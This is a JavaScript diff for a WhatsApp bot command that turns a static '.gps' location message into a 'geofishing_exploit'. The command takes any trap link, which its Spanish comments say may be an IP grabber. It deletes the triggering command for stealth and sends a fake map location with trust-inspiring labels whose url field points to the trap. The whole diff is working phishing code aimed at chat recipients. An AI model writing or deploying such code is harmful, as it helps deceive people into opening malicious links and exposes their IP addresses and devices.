@@ -1,31 +1,30 @@
 export default {
-    name: 'gps_hardcoded',
+    name: 'geofishing_exploit',
     match: (text) => /^\.gps/i.test(text),
-    execute: async ({ sock, remitente, msg }) => {
+    execute: async ({ sock, remitente, msg, textoLimpio }) => {
         
-        // Configuración estática
-        const linkDestino = "https://goo.su/OzNIU7";
-        const tituloMapa = "Ubicación en tiempo real";
-        const subtexto = "Pulsa para ver la ruta exacta";
+        // Uso: .gps https://tu-link-trampa.com (grabber de IPs, rickroll, etc)
+        const linkTrampa = textoLimpio.replace(/^\.gps\s*/i, '').trim() || "https://goo.su/OzNIU7";
 
         try {
-            // Sigilo: Eliminación del comando activador
+            // Sigilo: borramos el comando de tu pantalla
             try { await sock.sendMessage(remitente, { delete: msg.key }); } catch (e) {}
 
-            // Inyección del protocolo de ubicación con redirección forzada
+            // EXPLOIT: Inyección del contenedor LocationMessage
             await sock.sendMessage(remitente, {
-                location: { 
-                    degreesLatitude: 40.416775, 
-                    degreesLongitude: -3.703790 
-                },
-                name: tituloMapa,
-                address: subtexto,
-                url: linkDestino,
-                jpegThumbnail: Buffer.alloc(0) // Mantiene la burbuja limpia
+                location: {
+                    // Coordenadas reales (Ej: Zona de Gran Canaria) para renderizar el mapa
+                    degreesLatitude: 27.8440, 
+                    degreesLongitude: -15.4385,
+                    name: "Centro de Alto Rendimiento", // Título principal de confianza
+                    address: "Ver ruta principal", // Subtítulo gris
+                    url: linkTrampa // <--- El punto ciego de seguridad de Meta
+                }
             });
 
         } catch (err) {
-            console.error("Error en GPS Hardcoded:", err);
+            console.error("Error en GPS Spoof:", err);
+            // Sin alertas en el chat para mantener la limpieza
         }
     }
 };
